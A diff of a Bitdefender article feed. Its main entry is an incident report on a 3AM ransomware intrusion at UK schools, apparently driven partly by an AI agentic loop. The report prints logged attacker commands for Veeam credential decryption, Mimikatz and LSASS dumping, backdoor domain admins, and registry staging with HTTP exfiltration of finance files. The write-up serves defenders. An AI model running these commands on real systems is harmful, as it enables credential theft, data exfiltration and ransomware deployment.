@@ -1,4 +1,163 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+14c1b47f587e,14c1b47f587e,2026-11-03 13:56 UTC,"Attacks, Breaches & Threat Intel",Bitdefender,Bitdefender Business Insights,AI Security; Endpoint Security,Article,"3AM Hits European Schools: A Hybrid AI Ransomware Attack, Part Human, Part Agentic Loop",https://businessinsights.bitdefender.com/3am-ransomware-hybrid-ai-attack,"In an AI-generated attack, a model writes the malware itself, often in bulk; our APT36 research described this as “vibeware” (Bitdefender research, March 2026)","I’d like to thank my colleagues, Adrian Schipor and Martin Zugec, for their invaluable contributions to this research.
+
+TL;DR: It is the first case of this kind we have investigated, a hybrid operation in which some parts show a human operator at the keyboard while others behave like an agentic loop, a language model reading each result and retrying with different commands. In this case, a 3AM (ThreeAM) ransomware affiliate breached a European school estate in the UK, then used ordinary Windows tools to build domain trusts and reach other schools.
+
+Three Kinds of AI Attack, and Why This One Is a Hybrid
+
+Attacks that involve AI fall, broadly, into three categories.
+
+In an AI-generated attack, a model writes the malware itself, often in bulk; our APT36 research described this as “vibeware” (Bitdefender research, March 2026).
+
+In an AI-assisted attack, human engineers build the tools and use AI to speed up the work, as we assessed in the SilkParasite campaign (Bitdefender research, August 2026).
+
+In an AI-operated attack, AI works the intrusion itself: it chooses and writes the commands, reads the results and adjusts, the way an attacker at a keyboard would. The first two describe how malware is made. The third describes who, or what, is running the attack.
+
+We prefer putting attacks into buckets like these, but in cybersecurity things often sit in gray areas. In fact, this case we recently investigated does not fit a single bucket. A 3AM ransomware affiliate breached a school in the UK in what we consider a hybrid operation: some parts show a human operator at the keyboard, while others behave like an AI agent working throughout the intrusion.
+
+With the exception of the encryptor itself, the whole operation was built on legitimate, built-in tools, which is standard for ransomware operations. This is living off the land (LOTL): abusing tools already present on the victim’s machines instead of bringing in custom malware. The attacker worked through PowerShell, WMI (Windows Management Instrumentation, the built-in interface for running commands on other machines), reg, netsh, rundll32 and the domain and scheduling utilities that ship with Windows. In our earlier analysis of about 700,000 security incidents, 84% of high-severity attacks involved LOTL binaries (Bitdefender research, June 2025), and four of the five most abused binaries in that study (netsh, PowerShell, reg and rundll32) appear in this intrusion. A handful of public tools were brought in as well, among them an Impacket-style remote execution tool, Mimikatz and a published Veeam script, but nothing in the toolkit is novel. That is the lesson of this case: an AI-enabled attack does not have to be novel or creative to work (The Hacker News, September 2026). It uses the techniques defenders already know.
+
+What is different is how the attacker behaved, and several things point to an agentic loop, a program that feeds each result back to a model and runs what comes back. The commands carry the usual tells of a model: a call to the backup software’s web interface (Veeam, a widely used enterprise backup product) on a port and with a login method that do not match the vendor’s documentation, a mistake typical of writing from memory rather than from the manual (Veeam REST API authorization), along with confirmation files, self-labeled output and numbered revisions of the same script. The retries behave like a loop too.
+
+On 13 September the attacker ran a PowerShell command, re-ran it unchanged 41 seconds later, changed a single call 49 seconds after that, and then, 47 seconds later, abandoned PowerShell for wmic, the older built-in command-line interface to WMI. The complete rewrite arrived as fast as the minor changes before it, and a person writing it by hand would be expected to take noticeably longer. The same held across nine retries:
+
+The delay before the next attempt ran from 40 to 101 seconds whatever the size of the change, while moving on to a new task took minutes.
+
+That split, longer time between tasks and shorter between retries, is what it looks like if a person is choosing the next step and a model is handling the retries.
+
+On 13 September, for example, the commands before the retry sequence were simpler and sat two to sixteen minutes apart, the pace of someone reading output and deciding what to do next.
+
+The clearest example of this work is how the attacker joined the estate’s separate Active Directory domains (independent directories of accounts and computers). A domain trust, a configured relationship that lets accounts from one domain log on in another, is mechanical, order-sensitive work: it has to be set up correctly on both sides, names have to resolve between the domains, and one wrong detail stops everything. Here the attacker built the trusts and then ran a series of diagnostic probes and restarted the service that maintains the secure channel between domains.
+
+Our reading, which is interpretation and not a finding, is that this is the kind of work a model suits: repetitive configuration where the fix comes from reading an error and trying again. It is also work a defender can see, because a new trust between domains is a rare change and cheap to alert on.
+
+We were not able to access the machine the attacker worked from, so we cannot document anything about the language model itself: which model it was, whether it ran locally or remotely, or even whether a person was copying and pasting instructions and results between the implant and the model. What we can document is behavior, and the behavior is that of an agentic loop. We present the hybrid reading as the working model defenders should plan around, not as an established fact.
+
+As a European cybersecurity company, we wanted to share the first case of this kind that we have documented in Europe. But right now it is one case, an anecdote, and not a trend. In general, most of what Bitdefender MDR sees in real-world investigations is still boring. Vibeware, the clearest example of AI-generated malware, accounts for only about 0.07% of the malware samples we collect each month, and most intrusions we investigate still look the way they did before language models. The attack was not fast: even its quickest retries took 40 seconds or more. “Machine speed” is a phrase that marketing repeats, usually about very expensive incidents backed by frontier-scale infrastructure, and we expect real-world attacks, especially those running local models, to look closer to what we observed. It was not innovative in any way: built-in tools, a few public ones and a commodity encryptor.
+
+What this attack does show is that the hybrid approach works, and we assess that it makes economic sense for attackers, with a person setting the goals and a model handling the mechanical work. We can expect hybrid attacks like this one to become more common in 2027.
+
+Join us for the LIVE discussion: A Hybrid AI Ransomware Attack.
+
+What We Can and Cannot Show
+
+Reports of “AI ransomware” tend to blur three separate claims, and this case supports them to very different degrees.
+
+Claim
+
+Status in this case
+
+A language model generated the commands
+
+Strongly supported by the content of the commands
+
+An agentic loop (a program that feeds each command’s output back to a model and runs whatever it returns) chose each next action
+
+Behaves like one. Retries arrive at a steady pace whatever the size of the change. A person copying and pasting between a shell and a chat window cannot be excluded
+
+No human was involved in the hands-on phase
+
+Unsupported. Nothing in our telemetry bears on it
+
+The second claim rests on the retry cadence described above: a steady delay per attempt, whatever the size of the change, is how a loop that waits on a model behaves. A person pasting output between a shell and a chat window could produce the same rhythm, so we describe the behavior and leave the mechanism open. Our log holds only detected events, so some attempts may be missing and every gap is an upper bound.
+
+The pacing also bears on the third claim, though it cannot settle it. Between tasks, the gaps on 13 September were 5, 2, 14, 16 and 3 minutes, the pace of a person reading each result and choosing what to do next. Between retries, they were under two minutes. That is what a hybrid operation would look like, with a person deciding and a model doing the repetitive work, but a model that simply takes longer to plan a new task could look similar. Nothing in the telemetry rules either reading out.
+
+Telemetry alone cannot close the gap between the three claims, because the machine most likely to hold any automation was an unmanaged host (an internal machine running no Bitdefender agent) that sat outside our visibility. Every attacker action we saw originated there.
+
+Attribution and Victimology
+
+We attribute the intrusion to a 3AM (ThreeAM) ransomware affiliate, and the attribution is confirmed. ThreeAM operates on a ransomware-as-a-service model, in which the core group develops the encryptor and leases it to affiliates who carry out the intrusions and share the proceeds. The encryptor build and its command-line pattern (the host.exe binary invoked with an ID argument and a speed argument, an anti-debugging check, and deletion of Windows system-state backups) are consistent with earlier public ThreeAM analyses.
+
+The encryptor we analyzed is a Rust-based sample, and public tracking lists ThreeAM as first seen in February 2023. The rest of the tradecraft matches the classic affiliate playbook: Impacket-like tools for remote execution, credential theft from Veeam and from Windows endpoints, rogue domain administrators plus two-way trusts to reach separate domains, and removal of EDR agents before encryption. Background on the group is drawn from external tracking (WatchGuard, “ThreeAM”, October 2026).
+
+It is worth saying plainly what is conventional here, because it is most of the operation. The affiliate model, the access, the encryptor, and the choice of a mid-sized public-sector target are all ordinary and human. The sign of a model lives in how the commands behave, not in the strategy behind them.
+
+The target is a school estate in the UK. The machine list held 47 systems: about 21 servers, 8 of them domain controllers (the servers that hold the directory of accounts and enforce logins); 10 workstations still on Windows 10, which left support in October 2025; one domain controller on the older Windows Server 2012 R2; and the rest on Windows 11. The environment began as several separate Active Directory domains (separate account directories) that were not connected to each other.
+
+The attacker’s reconnaissance was specific to the sector. From a domain controller it enumerated trust relationships between domains and searched SYSVOL (the shared folder where Active Directory stores logon scripts, readable by any domain user) for the names and subnets of other schools. The two backdoor domain-administrator accounts it created, library and svc_bkpmon, carried names chosen to blend into a school’s account list.
+
+The Intrusion by Phase
+
+All times are UTC. Each observed behavior is mapped to a MITRE ATT&CK technique, the industry-standard catalog of attacker actions, on first mention. Command-level analysis of the oddities in these steps is held for the next section; here we record what happened, when, and where the outcome is unknown.
+
+Before September: Initial Access and Earlier Activity
+
+We cannot establish two things.
+
+First, initial access is unknown and we do not see how the attacker gained access. Second, two earlier events may or may not be related to this one: in one event, Restricted Admin mode (a remote-desktop mode that lets an account log on with a stolen hash or ticket instead of a password) was enabled on four machines on 23 January 2026. In another event, someone conducted a hand-typed interactive session on 5 June 2026. We treat these as earlier activity of an unconfirmed relationship, not as part of the September timeline.
+
+Credential Theft From the Backup Servers (10 to 11 September)
+
+The attacker’s first recorded September move targeted the backup infrastructure. A modified copy of a public tool (Veeam-Get-Creds.ps1) read the credentials stored in the backup software’s databases on three backup servers and decrypted them with DPAPI (the Windows Data Protection API, which encrypts secrets so only the owning account on that machine can read them back) (T1555 Credentials from Password Stores). Delivery used Impacket-style remote execution (Impacket is an open-source toolkit for running commands on remote Windows machines; see our explainer) (T1021.002 SMB/Windows Admin Shares). The first command ran through WMI, while the next two ran as services, with services.exe as the parent process, the pattern of service-based modules such as Impacket’s smbexec or psexec. A Chrome Login Data file, which holds saved browser passwords, was copied from a terminal server (T1555.003 Credentials from Web Browsers).
+
+Commands (sanitized, UTC). The first line is the full command as logged, with the Base64 payload shortened. Below it are the key lines of the decoded payload. The public tool (Veeam-Get-Creds.ps1) reads the database server, instance and database names from the registry. Here those three values are hard-coded, and the rest follows the public tool’s approach: read the stored credentials, then decrypt them with DPAPI.
+
+2026-09-10 23:50:04 cmd.exe /Q /c powershell.exe -e <Base64, 4104 chars> -OutputFormat Text 1> \Windows\Temp\<file> 2>&1 decoded (key lines): $SqlDatabaseName = ""VeeamBackup"" $SqlServerName = ""<backup-server>"" $SqlInstanceName = ""VEEAMSQL2016"" $SQL = ""SELECT [user_name] AS 'User',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] WHERE password <> ''"" $ClearPWD = [System.Security.Cryptography.ProtectedData]::Unprotect( $EnryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine ) 2026-09-11 01:36:23 cmd.exe /Q /c copy ""C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data"" ""C:\Windows\Temp\<epoch-timestamp>""
+
+Proof of Domain Admin and Domain Reconnaissance (12 to 13 September)
+
+From a machine where SQL Server was the parent process, the attacker tested connections to other hosts. At 01:01 on 12 September, through the same route, one script tested connectivity to four targets on the SMB, RDP and WinRM ports (445, 3389 and 5985), tried to add a Windows Defender exclusion for C:\Windows\Temp, and downloaded Mimikatz from its public GitHub release (version 2.2.0-20220919) into that folder. On a domain controller it then ran whoami and listed the Domain Admins and Enterprise Admins groups into a file named da_proof.txt, apparently a check of its own rights. The commands from 13 September onward redirect their output to files named __ followed by a timestamp in the hidden ADMIN$ share, which is the signature of the wmiexec module of Impacket, the toolkit described above.
+
+Image Above: How Impacket’s wmiexec runs a command on a target machine: the attacker sends it over WMI, the output lands in a timestamped file in the ADMIN$ share, the attacker reads it back, and a person or a model chooses the next command.
+
+Portable Python 3.11 was dropped into C:\Windows\Temp on two workstations to run a script named crackw.py (T1059.006 Python). On a domain controller, the attacker enumerated service accounts running under non-system users (T1087 Account Discovery), listed domain trusts with nltest /domain_trusts (a built-in tool for querying trust relationships) (T1482 Domain Trust Discovery), and ran the SYSVOL search for other schools’ names and subnets.
+
+Commands (sanitized, UTC). The <...> tokens replace names, addresses, search terms and identifiers that would reveal the victim. The 2>/dev/null redirects and the ===...=== markers are as the attacker wrote them.
+
+2026-09-12 00:35:27 powershell -NoProfile -EncodedCommand <Base64, 1216 chars> decoded: Write-Output ('PORT445: ' + (Test-NetConnection -ComputerName <ip> -Port 445 -WarningAction SilentlyContinue).TcpTestSucceeded) net use \\<ip>\IPC$ /user:<backup-account> <redacted> 2>&1 | ForEach-Object { Write-Output ('IPC: ' + $_) } Write-Output '== SHARES ==' $out = net view \\<ip> 2>&1 foreach ($l in $out) { Write-Output ('SH: ' + $l) } net use \\<ip>\IPC$ /delete 2>&1 | Out-Null 2026-09-12 01:01:13 cmd.exe /c powershell -NoProfile -EncodedCommand <Base64, 3424 chars> decoded: $ProgressPreference='SilentlyContinue' Write-Output '== CONNECTIVITY ==' foreach ($t in @(@('<ip>',445), @('<ip>',3389), @('<ip>',5985), @('<ip>',445))) { $r = Test-NetConnection -ComputerName $t[0] -Port $t[1] -WarningAction SilentlyContinue Write-Output ($t[0] + ':' + $t[1] + ' = ' + $r.TcpTestSucceeded) } Write-Output '== EXCLUSION ==' try { Set-MpPreference -ExclusionPath 'C:\Windows\Temp' -ErrorAction Stop; Write-Output 'EXCL-OK' } catch { Write-Output ('EXCL-ERR: ' + $_.Exception.Message.Substring(0,80)) } Write-Output '== DOWNLOAD ==' try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile 'C:\Windows\Temp\m.zip' -TimeoutSec 120 -UseBasicParsing Write-Output ('DL: ' + (Get-Item C:\Windows\Temp\m.zip).Length) Expand-Archive -Path 'C:\Windows\Temp\m.zip' -DestinationPath 'C:\Windows\Temp\mimi' -Force Get-ChildItem 'C:\Windows\Temp\mimi' -Recurse -Filter mimikatz.exe | ForEach-Object { Write-Output ('EXE: ' + $_.FullName + ' | ' + $_.Length) } } catch { Write-Output ('DL-ERR: ' + $_.Exception.Message.Substring(0,[Math]::Min(120,$_.Exception.Message.Length))) } 2026-09-12 01:55:24 cmd.exe /c whoami ^& net group ""Domain Admins"" /domain ^& net group ""Enterprise Admins"" /domain > C:\Windows\Temp\da_proof.txt 2>&1 2026-09-13 02:14:23 cmd.exe /Q /c cmd /c echo ===<TERM>-REFS=== & findstr /s /i /m ""<term> <school> <school-id> <ip-range>"" C:\Windows\SYSVOL\<domain>\scripts\*.* 2>/dev/null & findstr /s /i /m ""<term> <school> <school-id>"" C:\*.ini C:\*.bat C:\*.cmd C:\*.xml C:\*.txt 2>/dev/null & echo ===NETLOGON=== & dir C:\Windows\SYSVOL\<domain>\scripts 2>/dev/null & echo ===TRUSTS=== & nltest /domain_trusts 1> \\<host>\ADMIN$\__<epoch-timestamp> 2>&1
+
+Credential Dumping and Backdoor Accounts (14 September)
+
+The attacker saved the SECURITY and SYSTEM registry hives from the 2012 R2 domain controller with reg save (these hives contain hashed credentials and secrets), and ran Mimikatz, a well-known credential-dumping tool, renamed to sysmon64.exe to look like a legitimate monitoring binary (T1003 OS Credential Dumping, T1036 Masquerading). An attempt was made to dump the memory of LSASS (the Local Security Authority Subsystem Service, the Windows process that holds live credentials). Its outcome is unknown. The forensics team also saw the SAM and SECURITY hives dumped remotely over the winreg named pipe, which is how the RemoteRegistry service is reached, and found Mimikatz under several other names, among them svcstat.exe, two randomly named .tmp.exe files and a copy dropped in a buzzypdf application folder. Two backdoor domain-administrator accounts were created, by two separate routes, which made persistence redundant: one from the context of the school-management system’s backup job, the other over WinRM (Windows Remote Management, the remote PowerShell service) (T1136.002 Create Account: Domain Account, T1021.006 Windows Remote Management).
+
+Commands (sanitized, UTC). Note the second reg save: the same command repeated 40 seconds later with 2>&1 added. In the for /f line, the missing delims="","" is why rundll32 received K"" as the process ID.
+
+2026-09-14 15:55:24 cmd.exe /c ""reg save HKLM\SECURITY C:\Windows\Temp\sec.save /y"" 2026-09-14 15:55:25 cmd.exe /c ""reg save HKLM\SYSTEM C:\Windows\Temp\sys.save /y"" 2026-09-14 15:56:04 cmd.exe /c ""reg save HKLM\SECURITY C:\Windows\Temp\sec.save /y 2>&1"" 2026-09-14 16:59:27 cmd /c C:\Windows\Temp\sysmon64.exe ""log C:\Windows\Temp\mimi.log"" ""privilege::debug"" ""sekurlsa::logonpasswords"" ""lsadump::cache"" ""exit"" > C:\Windows\Temp\mimi_run.txt 2>&1 2026-09-14 17:02:38 cmd /c for /f ""tokens=2"" %a in ('tasklist /fi ""imagename eq lsass.exe"" /fo csv ^| more +1') do @rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %~a C:\Windows\Temp\ls.dmp full > C:\Windows\Temp\dmp.log 2>&1 2026-09-14 17:02:53 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump K"" C:\Windows\Temp\ls.dmp full 2026-09-14 19:06:14 net user library <redacted> /add /domain 2026-09-14 19:06:15 net group ""Domain Admins"" library /add /domain 2026-09-15 00:03:36 net user svc_bkpmon <redacted> /add /domain 2026-09-15 00:03:37 net group ""Domain Admins"" svc_bkpmon /add /domain
+
+Collection and Exfiltration Through the Registry (15 September)
+
+The second attempt at the backup-software credentials ran over DCOM/CIM (Windows remote-management interfaces for invoking actions on other machines), which are the transport for WMI (Windows Management Instrumentation, a built-in interface for running commands on remote machines) (T1047 Windows Management Instrumentation), and returned its results through the remote registry under HKLM\SOFTWARE\VC31 rather than over the network directly. This is the attempt that used the wrong port and authentication scheme, analyzed in the next section; its outcome is unknown. Forty files from a finance share were staged into registry values the same way, copied with robocopy to the unmanaged host (using the library account) and to another domain’s SYSVOL (using svc_bkpmon), zipped, and sent by HTTP POST to a page named rcv.aspx on the unmanaged host, which served as the attacker’s C2 (command-and-control, the channel an attacker uses to direct compromised machines) endpoint (T1074 Data Staged, T1112 Modify Registry, T1041 Exfiltration Over C2 Channel). Periodic alive HH:mm status messages went to the same endpoint. The registry-as-transport channel is an unusual choice and a strong indicator to hunt for.
+
+Commands (sanitized, UTC). The first line is the probe that created a scheduled task named VEEAMPROBE on the backup server, running as SYSTEM. The last two are the upload and the status message. The decoded script is reformatted for readability.
+
+2026-09-15 02:39:47 cmd /c schtasks /s <ip> /u svc_bkpmon /p <redacted> /create /tn VEEAMPROBE /tr ""cmd /c echo TASK-OK ^> C:\Windows\Temp\task_probe.txt"" /sc once /st 23:59 /ru SYSTEM /f ^> C:\Windows\Temp\st.txt 2^>^&1 ^& schtasks /s <ip> /u svc_bkpmon /p <redacted> /run /tn VEEAMPROBE ^>^> C:\Windows\Temp\st.txt 2^>^&1 2026-09-15 05:19:41 cmd /c net use \\<unmanaged-host>\C$ library /user:<domain3-netbios>\library <redacted> C:\Windows\Temp\rc.txt 2>&1 & robocopy ""<finance-share>\<folder>"" ""\\<unmanaged-host>\C$\Windows\Temp\rst\finance_mirror\<folder>"" /E /R:1 /W:1 /NFL /NDL >> C:\Windows\Temp\rc.txt 2>&1 & robocopy ""C:\<output-folder>"" ""\\<unmanaged-host>\C$\Windows\Temp\rst\finance_mirror\<output-folder>"" /E /R:1 /W:1 /NFL /NDL >> C:\Windows\Temp\rc.txt 2>&1 & net use \\<unmanaged-host>\C$ /d >> C:\Windows\Temp\rc.txt 2>&1 2026-09-15 05:22:21 powershell -NoProfile -EncodedCommand <Base64, 1984 chars> decoded: $files = Get-ChildItem '<finance-share>' -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 0 -and $_.Length -lt 700KB -and $_.Extension -match '\.(txt|csv|dbf|mdb|xls|xlsx|pdf|doc|docx|xml|ini|log|tsv|rtf)$' } | Select-Object -First 40 $n = 0 foreach ($f in $files) { $n++ $vname = 'FIN' + $n.ToString('D3') try { $b = [Convert]::ToBase64String([IO.File]::ReadAllBytes($f.FullName)) if ($b.Length -lt 900000) { New-ItemProperty -Path HKLM:\SOFTWARE -Name $vname -Value ($f.FullName + '|' + $b) -PropertyType String -Force -ErrorAction Stop | Out-Null } } catch {} } New-ItemProperty -Path HKLM:\SOFTWARE -Name FINCOUNT -Value $n -PropertyType String -Force | Out-Null 2026-09-15 05:24:16 cmd /c net use \\<host>\SYSVOL /user:<domain2>\svc_bkpmon <redacted> > C:\Windows\Temp\rc2.txt 2>&1 & robocopy ""<finance-share>\<folder>"" ""\\<host>\SYSVOL\<domain>\scripts\finmirror"" /E /R:1 /W:1 /NFL /NDL /MAX:2048000 >> C:\Windows\Temp\rc2.txt 2>&1 & net use \\<host>\SYSVOL /d >> C:\Windows\Temp\rc2.txt 2>&1 2026-09-15 05:27:40 powershell -NoProfile -Command ""try { Compress-Archive -Path '<finance-share>\<folder>','<finance-share>\Backup','C:\<output-folder>' -DestinationPath C:\Windows\Temp\fin.zip -Force -ErrorAction Stop; $len=(Get-Item C:\Windows\Temp\fin.zip).Length; Invoke-WebRequest -Uri 'http://<unmanaged-host>/rcv.aspx?f=fin.zip' -Method Post -InFile C:\Windows\Temp\fin.zip -TimeoutSec 180 -UseBasicParsing | Out-Null; ('POSTED size=' + $len) | Out-File C:\Windows\Temp\posted.txt } catch { ('ERR ' + $_.Exception.Message) | Out-File C:\Windows\Temp\posted.txt }"" 2026-09-15 05:32:56 powershell -NoProfile -Command ""$t = Get-Date -Format HH:mm; $st = 'alive ' + $t; if (Test-Path C:\Windows\Temp\posted.txt) { $st = [IO.File]::ReadAllText(C:\Windows\Temp\posted.txt) } ; try { Invoke-WebRequest -Uri 'http://<unmanaged-host>/rcv.aspx?f=status.txt' -Method Post -Body $st -TimeoutSec 30 -UseBasicParsing | Out-Null } catch { 'postfail ' + $_.Exception.Message | Out-File C:\Windows\Temp\posted.txt -Append }""
+
+Domain Trusts and the Access Push (18 September)
+
+Within a roughly three-hour window the attacker joined three separate domains with two-way trusts and pushed the backdoor account’s access across the estate. This is the clearest worked example of the hybrid pattern, so it has its own section below rather than being narrated twice here.
+
+Loader Development and Encryption (19 September)
+
+An attempt to remove EDR, a standard step before encryption, ran on the file server as av_remove.ps1, then again as av_remove2.ps1 seven minutes later, and a third revision, av_remove3.ps1, is known from its hash (T1562.001 Impair Defenses). The scripts were aimed at Sophos and Bitdefender, and anti-tampering controls blocked the removal (Bitdefender TechZone, anti-tampering and detection evasion). Also on 19 September, a randomly named executable started by services.exe ran a psexec-ok marker command, which matches RemCom-based execution, the service implementation used by Impacket’s psexec module. A script loader was developed on one workstation through visible iterations and then deployed to about 40 machines using randomly named job*.cmd and cfg*.txt files, in a fixed order, at about 101 seconds per machine, repeating roughly every two hours (T1053.005 Scheduled Task). The ThreeAM encryptor (host.exe) then ran from 05:07 to 05:33, at 12 to 13 seconds per machine, deleting system-state backups as it went with wbadmin (T1486 Data Encrypted for Impact, T1490 Inhibit System Recovery). Three further install attempts (prx, prx2, prx3) followed on one server, and a persistent callback was left on the server running SQL Server.
+
+Commands (sanitized, UTC). The loader step writes step1.txt, step2.txt and step3.txt as it goes, which is the self-logging described in the next section. The -k value is withheld. It is not related to the data encryption: from what we analyzed, it serves two purposes, as an anti-sandbox check (the real sample only runs when the argument is supplied) and as a victim identification ID for the affiliate.”
+
+2026-09-19 00:27:22 cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\av_remove.ps1 2026-09-19 00:34:23 cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\av_remove2.ps1 2026-09-19 02:29:28 powershell -NoProfile -Command ""$d=[IO.File]::ReadAllText('C:\Windows\Temp\svc_data.txt');Set-Content C:\Windows\Temp\step1.txt $d.Length;$p='C:\Windows\Temp\svc_test.ps1';[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($d));Set-Content C:\Windows\Temp\step2.txt (Test-Path $p);powershell -NoProfile -ExecutionPolicy Bypass -File $p;Set-Content C:\Windows\Temp\step3.txt ""done rc=$LASTEXITCODE"""" 2026-09-19 04:49:48 services.exe > C:\Windows\<random-name>.exe 2026-09-19 04:49:50 cmd /c echo psexec-ok ^> C:\Windows\Temp\psx_mark.txt 2026-09-19 05:07:04 cmd.exe /c C:\Windows\Temp\1\host.exe -k <victim ID withheld> -s 15 2026-09-19 05:07:04 (child of host.exe) netsh.exe advfirewall firewall set rule group=""Network Discovery"" new enable=Yes 2026-09-19 05:15:18 (child of host.exe, on another machine) wbadmin.exe delete systemstatebackup -keepVersions:0 -quiet 2026-09-19 05:37:04 cmd.exe /c """"C:\Windows\Temp\prx_go.cmd"""" 2026-09-19 05:37:04 powershell -NoProfile -Command ""$d=[IO.File]::ReadAllText('C:\Windows\Temp\prx.txt');iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($d)))""
+
+Defender action: Alert on credential-reading access to backup-software databases and on reg save of the SECURITY, SYSTEM, or SAM hives (the SAM hive stores local account password hashes) by any process other than a known backup or administration job. Both are rare on a healthy network and both sat at the front of this intrusion.
+
+What the Commands Tell Us About the Model Behind Them
+
+This section addresses claim one only: whether a language model generated the commands. The evidence is presented in order of strength, and the strength is labeled. None of it bears on whether a program or a person carried each result back to the model.
+
+Errors a Writer Makes From Memory, Not From the Manual
+
+The strongest signal is a cluster of mistakes typical of generating commands from recalled knowledge rather than from documentation or trial and error.
+
+The backup-software call is the clearest. It reached for port 9392 with HTTP Basic authentication against the real credentials path, when Veeam’s REST examples use port 9419 and require an OAuth2 token. The specifics are the kind a manual or a working script would have supplied; a writer reconstructing the call from memory gets the shape right and the specifics wrong. We could not confirm whether that resource ever returns passwords at all.
+
+2026-09-15 02:41:25 powershell -NoProfile -Command ""[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; try { $r=Invoke-RestMethod -Uri 'https://<ip>:9392/api/v1/credentials' -Credential (New-Object PSCredential('svc_bkpmon',(ConvertTo-SecureString <redacted> -AsPlainText -Force))) -Authentication Basic -ErrorAction Stop; $r.data | ForEach-Object { $_.username + ' : ' + $_.password + ' | ' + $_.description } | Out-File C:\Windows\Temp\rest.txt } catch { ('ERR ' + $_.Exception.Message) | Out-File C:\Windows\Temp\rest.txt }""
+
+An LSASS-dump one-liner used for /f ""tokens=2"" over tasklist /fo csv output without specifying delims="","". In plain terms, the command tried to pull the second column of a comma-separated list but, without telling the parser that commas separate the columns, it grabbed the wrong fragment and passed the trailing K"" of a memory-size figure where a process ID belonged. It is the kind of delimiter parsing bug that compiles in the writer’s head and fails on the machine. The full command and the resulting rundll32 call, with the stray K"", are shown in the credential-dumping section above.
+
+Bash-style \$ escape sequences appeared inside Windows double-quoted PowerShell on 14, 15, and 19 September. That idiom belongs to Unix shells, not Windows ones. Its recurrence on three separate days (14, 15, and 19 September) is the point: this is a habit, not a one-off slip. One example, from 14 September:
+
+2026-09-14 17:01:40 powershell -c ""Get-CimInstance win32_service | Where-Object { \$_.StartName -and \$_.StartName -notmatch 'SYSTEM|LOCAL|NETWORK|NT ' } | Select Name,StartName,PathName | Format-Table -AutoSize | Out-File C:\Windows\Temp\svc2.txt -Width 250""
+
+Unix Habits in Windows Commands
+
+Three commands used 2>/dev/null, the Unix way of discarding error output, inside Windows command lines. All three fell in one 51-minute window on 13 September and the idiom never recurs. On its own it would be weak. Alongside the escape errors, it is consistent with a writer whos [truncated for CSV - full text is in the JSON export]"
 c724e4237f65,c724e4237f65,2026-10-29 06:42 UTC,Business & Industry News,Bitdefender,Bitdefender Business Insights,Threat Intelligence; Threat and Exposure Management,Article,Bitdefender Named a Representative Vendor in the 2026 Gartner® Market Guide for Managed Detection and Response,https://businessinsights.bitdefender.com/bitdefender-named-representative-vendor-2026-gartner-market-guide-mdr,"As AI-enabled attacks become faster and more frequent, exposure reduction is a critical addition to detection and response","For the fifth consecutive year, Bitdefender is included as a Representative Vendor in the 2026 Gartner® Market Guide for Managed Detection and Response.
 
 The Market Guide offers a timely opportunity to look beyond the table stakes of 24x7 alert monitoring and understand how modern MDR should leverage AI, how providers should help contain attacks, and the importance of MDR in reducing risk exposure.
@@ -1076,54 +1235,3 @@ Bitdefender provides cybersecurity solutions and advanced threat protection to h
 Watch and Read Ctrl Alt DecodeWatch: The Ctrl Alt Decode Live BriefingSubscribe: The Ctrl Alt Decode Newsletter
 
 We would like to thank Bitdefenders Stefan Hanu, Mihai Leonte, Gabriel Macovei, and Andrei Mogage for their help putting this report together."
-7bb9cf7dba4c,7bb9cf7dba4c,2026-10-05 16:07 UTC,General Security News,Bitdefender,Bitdefender Business Insights,Endpoint Security; AI Security,Article,"Your Security Stack Has AI, but Can Your Team Use It?",https://businessinsights.bitdefender.com/your-security-stack-has-ai-but-can-your-team-use-it,"Not only is this possible, but it’s also critical in our era of AI-enabled attacks","AI is rapidly becoming essential for defenders. But adding AI to a security stack doesn't automatically make security better.
-
-For mid-market organizations with lean IT and security teams, a new AI-powered tool can mean more alerts, another workflow, and additional integration work. This adds to the complexity organizations already face.
-
-The sweet spot is to integrate AI in a way that simplifies security operations and improves security outcomes. Not only is this possible, but it’s also critical in our era of AI-enabled attacks.
-
-What Kind of AI-Enabled Attacks Are Organizations Seeing in 2026?
-
-According to the 2026 Bitdefender Cybersecurity Assessment, which surveyed 1,200 IT and cybersecurity professionals, 59% of respondents say their organization has experienced social engineering attacks they believe involved AI; 56% report seeing AI-related malware attacks; and 70% say they are seeing more sophisticated phishing enabled by AI.
-
-AI-enabled attacks do not necessarily introduce entirely new tactics, but they make familiar ones faster, cheaper, more scalable, and easier to adapt. This speed comes as attack surfaces expand. Cloud services, identities, business partners, employee AI adoption, and over-privileged endpoint tools create more opportunities to gain entry or move through an environment.
-
-Will an AI-enabled Point Solution Solve the Challenge?
-
-In most cases, the best answer to AI-enabled cyberattacks is not another point solution, because organizations have too many of those already. Research cited in Bitdefender’s new solution guide, Operationalizing AI Across Prevention, Protection, Detection and Response, found that organizations average 83 security solutions and that 52% of security professionals identify complexity as their greatest operational obstacle.
-
-While organizations must implement AI-enabled defenses to match the pace of AI-enabled attacks, adding another point solution creates new challenges: integration work, more alerts, and time for training time due to unfamiliar workflows. Another unexpected result from this approach? A standalone AI product may automate one task (or a few) without improving the program as a whole.
-
-How Can We Operationalize AI to Improve Cybersecurity?
-
-Successfully operationalized AI works across the security lifecycle rather than inside one feature. It draws on context from endpoints, identities, cloud, networks, email, vulnerabilities, and user activity to help teams prioritize risk and act through familiar workflows.
-
-That context changes what AI can deliver to defenders.
-
